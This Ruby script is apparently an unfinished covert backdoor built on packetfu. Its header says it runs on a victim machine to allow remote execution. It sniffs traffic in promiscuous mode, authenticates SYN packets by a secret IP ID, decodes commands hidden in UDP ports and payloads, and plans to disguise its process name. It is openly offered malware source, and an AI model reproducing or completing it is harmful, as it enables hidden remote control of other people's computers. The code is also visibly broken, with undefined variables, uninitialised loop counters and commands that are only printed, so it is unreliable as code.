# Runs on victim machine, allows remote execution through client app
require 'rubygems'
require 'packetfu'

include PacketFu

#TODO: Move these functions to a diff file
# Utility function for loading latest config
def loadConfig(filePath)
	#TODO: Load up file and get config
	#For now just hard coded.
	$iName = "eth0"
	identKey = 12345
	listenPortMain = "80" # Port to listen for connection requests
	processName = "xyz" # Change process name to hide.
	filterTCP = "tcp and port #{listenPortMain}"
	userCmdField = "src-port" # Options: src-port, dst-port
	userCmdRun = "20"
end

# Function for handling client session
def clientListen(ip,port)
	# Start listening for connection packets via UDP
	capturedUDP = PacketFu::Capture.new(:iface => config[:iface], :start => true, :promisc => true, :filter => "udp and port #{port} and src host #{ip}")

	capturedUDP.stream.each { |packet|
		pkt = Packet.parse packet
		# Check that it is a UDP packet
		if pkt.is_udp?
			# Is it one of our UDP packets?
			if pkt.ip_id == identKey
				# Get the data
				data = pkt.payload()
				# Look for the command type
				if userCmdField == "src-port"
					cmdFieldVal = pkt.udp_src
				end
				if userCmdField == "dst-port"
					cmdFieldVal = pkt.udp_dst
				end
				# Command processing
				if userCmdField == userCmdRun
					cmdDataChrs = [];
					# Check for sequence number
					seqCurrent = pkt.payload[0].unpack("H*")[0].to_i
					seqTotal   = pkt.payload[1].unpack("H*")[0].to_i
					dataLen    = (pkt.payload[2].unpack("H*").chr + pkt.payload[2].unpack("H*").chr).to_i
					while pos <= dataLen do
						cmdDataChrs.push(pkt.payload[pos])
						pos = pos + 1
					end
					cmdData = cmdDataChrs.unpack("H*")
					print "Got command: #{cmdData}"
				end
			end
		end
	}
end

#Construct TCP Packet
def tcpConstruct(identKey,srcIP,srcPort,dstIP,dstPort,flags, payload)
	#--> Build TCP/IP
    
    #- Build Ethernet header:---------------------------------------
    pkt = PacketFu::TCPPacket.new(:config => $config , :flavor => "Linux")
	# pkt.eth_src = "00:11:22:33:44:55" # Ether header: Source MAC ; you can use: pkt.eth_header.eth_src
	# pkt.eth_dst = "FF:FF:FF:FF:FF:FF" # Ether header: Destination MAC ; you can use: pkt.eth_header.eth_dst
    pkt.eth_proto	# Ether header: Protocol ; you can use: pkt.eth_header.eth_proto
    #- Build IP header:---------------------------------------
    pkt.ip_v = 4	# IP header: IPv4 ; you can use: pkt.ip_header.ip_v
    pkt.ip_hl = 5	# IP header: IP header length ; you can use: pkt.ip_header.ip_hl
    pkt.ip_tos	= 0	# IP header: Type of service ; you can use: pkt.ip_header.ip_tos
    pkt.ip_len	= 20	# IP header: Total Length ; you can use: pkt.ip_header.ip_len
    pkt.ip_id = identKey	# IP header: Identification ; you can use: pkt.ip_header.ip_id
    pkt.ip_frag = 0	# IP header: Don't Fragment ; you can use: pkt.ip_header.ip_frag
    pkt.ip_ttl = 115	# IP header: TTL(64) is the default ; you can use: pkt.ip_header.ip_ttl
    pkt.ip_proto = 6	# IP header: Protocol = tcp (6) ; you can use: pkt.ip_header.ip_proto
    pkt.ip_sum	# IP header: Header Checksum ; you can use: pkt.ip_header.ip_sum
    pkt.ip_saddr = srcIP	# IP header: Source IP. use $config[:ip_saddr] if you want your real IP ; you can use: pkt.ip_header.ip_saddr
    pkt.ip_daddr = dstIP	# IP header: Destination IP ; you can use: pkt.ip_header.ip_daddr
    #- TCP header:---------------------------------------
    pkt.payload = payload	# TCP header: packet header(body)
    pkt.tcp_flags.ack = flags[0]	# TCP header: Acknowledgment
    pkt.tcp_flags.fin = flags[1]	# TCP header: Finish
    pkt.tcp_flags.psh = flags[2]	# TCP header: Push
    pkt.tcp_flags.rst = flags[3]	# TCP header: Reset
    pkt.tcp_flags.syn = flags[4]	# TCP header: Synchronize sequence numbers
    pkt.tcp_flags.urg = flags[5]	# TCP header: Urgent pointer
    pkt.tcp_ecn = 0	# TCP header: ECHO
    pkt.tcp_win	= 8192	# TCP header: Window
    pkt.tcp_hlen = 5	# TCP header: header length
    pkt.tcp_src = srcPort	# TCP header: Source Port (random is the default )
    pkt.tcp_dst = dstPort	# TCP header: Destination Port (make it random/range for general scanning)
    pkt.recalc	# Recalculate/re-build whole pkt (should be at the end)
    return pkt
end

def dataListener(identKey,dstIP,dstPort)
	# Listen for UDP data packets
	print "Listening for Data from #{dstIP}\n"
	capturedUDP = PacketFu::Capture.new(:iface => $config[:iface], :start => true, :promisc => true, :filter => "udp and port #{dstPort}")

	capturedTCP.stream.each { |packet|
		pkt = Packet.parse packet
		if pkt.ip_id == identKey
			# Get Packet Type
			if userCmdField == "src-port"
				dataType = pkt.udp_src
			elsif userCmdField == "dst-port"
				dataType = pkt.udp_dst
			end
			
			if dataType == userCmdRun
				cmdLen = pkt.payload[0].unpack("c*")
				cmd = ""
				while i <= cmdLen do
					cmd += pkt.payload[i].unpack("h*")
				end
				print "Command: #{cmd}\n"
			end
		end
	}
end
# - - - - Begin Main

# Get config from file
loadConfig("/path/to/file.txt")

#$config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> iName)).config # set interface
#$config = PacketFu::Config.new(:iface=> $iName).config # use this line instead of above if you face `whoami?': uninitialized constant PacketFu::Capture (NameError)

#TODO: Mask process name from config
begin
	# Start listening for connection packets via TCP
	print "starting up\n"
	$stdout.flush
	capturedTCP = PacketFu::Capture.new(:iface => $iName, :start => true, :promisc => true, :filter => "tcp")
	capturedTCP.stream.each { |pack|
		pkt = Packet.parse pack
		# Check that it is a TCP packet?
		if pkt.is_tcp?
			# Is it one of our SYN packets?
			if pkt.tcp_flags.syn == 1 && pkt.ip_id == $identKey
				# TODO: Respond with SYN/ACK
				flags = [1,0,0,0,1,0]
				payload = ""
				tcpResp = tcpConstruct($identKey,srcIP,80,dstIP,Random.rand(65535),flags, payload)
				tcpResp.to_w # Sent
				# TODO: Use thread instead.
				dataListener($identKey,dstIP,dstPort)
			end
		end
	}
	rescue Interrupt
	puts "Interrupted by User"
	exit 0
end
